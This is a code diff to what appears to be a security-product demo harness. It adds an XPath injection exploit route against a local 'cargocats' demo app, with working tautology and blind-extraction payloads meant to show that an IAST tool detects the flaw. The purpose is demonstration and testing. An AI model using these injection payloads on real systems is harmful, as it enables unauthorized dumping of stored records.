@@ -690,6 +690,35 @@ def exploit_php_path_traversal():
         exploit_running = False
 
 
+@app.route('/exploit/xpath-injection')
+def exploit_xpath_injection():
+    global exploit_running, exploit_state, exploit_output_buffer, stop_exploit_flag
+
+    if exploit_running:
+        return jsonify({"status": "error", "message": "Exploit already running"}), 400
+
+    exploit_running = True
+    exploit_state = "xpath_injection"
+
+    try:
+        session = requests.Session()
+        login_result = run_login_exploit(session)
+        if not login_result:
+            log_exploit_output("Login failed - cannot proceed with XPath injection exploit", "ERROR")
+            return jsonify({"status": "error", "message": "Login failed - cannot proceed with XPath injection exploit"}), 500
+
+        result = run_xpath_injection_exploit(session)
+        exploit_state = "finished"
+        log_exploit_output(f"XPath injection exploit completed - Success: {result}")
+        return jsonify({"status": "success", "message": "XPath injection exploit completed", "result": result}), 200
+    except Exception as e:
+        exploit_state = "error"
+        log_exploit_output(f"XPath injection exploit failed: {str(e)}", "ERROR")
+        return jsonify({"status": "error", "message": f"XPath injection exploit failed: {str(e)}"}), 500
+    finally:
+        exploit_running = False
+
+
 @app.route('/exploit/list')
 def exploit_list():
     """List all available individual exploits"""
@@ -704,7 +733,8 @@ def exploit_list():
         {"name": "XXE", "endpoint": "/exploit/xxe", "description": "XML External Entity injection"},
         {"name": "Insecure Deserialization", "endpoint": "/exploit/deserialization", "description": "Java Insecure Deserialization exploit using address import functionality"},
         {"name": "SSTI", "endpoint": "/exploit/ssti", "description": "FreeMarker Server-Side Template Injection (CVE-2025-64087)"},
-        {"name": "Path Traversal (PHP)", "endpoint": "/exploit/php-path-traversal", "description": "Path traversal exploit via PHP tracking report download endpoint"}
+        {"name": "Path Traversal (PHP)", "endpoint": "/exploit/php-path-traversal", "description": "Path traversal exploit via PHP tracking report download endpoint"},
+        {"name": "XPath Injection (PHP)", "endpoint": "/exploit/xpath-injection", "description": "XPath injection exploit via PHP tracking report search endpoint (Assess-only, no Protect rule)"}
     ]
     
     return jsonify({
@@ -1633,6 +1663,63 @@ def run_php_path_traversal_exploit(session):
     return success
 
 
+def run_xpath_injection_exploit(session):
+    """Execute XPath injection exploits via PHP tracking report search endpoint.
+
+    Note: XPath Injection is detected by Contrast Assess (IAST) but has no
+    corresponding Protect (RASP) rule. This demo exists to show that Assess
+    catches vulnerabilities Protect cannot block.
+    """
+    log_exploit_output("Executing XPath injection exploits via PHP tracking report search endpoint")
+
+    # -------------------------------------------------------
+    # 1. Tautology injection on the search endpoint.
+    #    Closes the contains() predicate and adds an always-true clause
+    #    to dump every shipment record.
+    #    Injected: x') or '1'='1' or contains(cat,'
+    # -------------------------------------------------------
+    search_payload = "x') or '1'='1' or contains(cat,'"
+    r = session.get(
+        f"http://cargocats.localhost/api/tracking-report/search?q={requests.utils.quote(search_payload)}",
+        timeout=15
+    )
+    log_exploit_output(f"XPath injection (search tautology) response status: {r.status_code}")
+    if r.status_code == 200:
+        try:
+            data = r.json()
+            count = data.get('count', 0)
+            log_exploit_output(f"XPath injection search returned {count} result(s)")
+            if count > 1:
+                log_exploit_output("SUCCESS: XPath injection dumped all shipment records via tautology injection")
+        except Exception:
+            pass
+
+    # -------------------------------------------------------
+    # 2. Blind XPath, exfiltrate cat names containing 'iskers'.
+    #    Closes contains() early then filters on a known cat name substring.
+    #    Injected: x') or contains(cat,'iskers') or contains(cat,'
+    # -------------------------------------------------------
+    blind_payload = "x') or contains(cat,'iskers') or contains(cat,'"
+    r = session.get(
+        f"http://cargocats.localhost/api/tracking-report/search?q={requests.utils.quote(blind_payload)}",
+        timeout=15
+    )
+    log_exploit_output(f"XPath injection (blind/exfiltration) response status: {r.status_code}")
+    if r.status_code == 200:
+        try:
+            data = r.json()
+            results = data.get('results', [])
+            if results:
+                cats = [s.get('cat', '') for s in results]
+                log_exploit_output(f"SUCCESS: Blind XPath exfiltrated cat name(s): {cats}")
+            else:
+                log_exploit_output("Blind XPath returned no results (cat name not in XML yet)")
+        except Exception:
+            pass
+
+    return r.status_code in [200, 500]
+
+
 ########################################
 # exploits
 ########################################
@@ -1758,6 +1845,14 @@ def exploit():
         if check_exploit_stop("PHP Path Traversal"):
             return
         run_php_path_traversal_exploit(session)
+
+        # ================================================
+        # XPATH INJECTION EXPLOIT (Assess-only, no Protect rule)
+        # ================================================
+        exploit_state = "xpath_injection"
+        if check_exploit_stop("XPath injection"):
+            return
+        run_xpath_injection_exploit(session)
 
         exploit_state = "finished"
         log_exploit_output("Exploit execution completed successfully")
@@ -2211,6 +2306,14 @@ def traffic():
                 timeout=10, allow_redirects=False
             )
             log_traffic_output(f"Tracking report download ({chosen}) - Status: {r.status_code}")
+
+            # Benign search by a city or cat name fragment (legitimate use of the search endpoint)
+            search_term = random.choice(["new york", "chicago", "whiskers", "mittens"])
+            r = session.get(
+                f"http://cargocats.localhost/api/tracking-report/search?q={requests.utils.quote(search_term)}",
+                timeout=10, allow_redirects=False
+            )
+            log_traffic_output(f"Tracking report search ({search_term}) - Status: {r.status_code}")
 
         traffic_state = "finished"
         log_traffic_output("Traffic generation completed successfully")
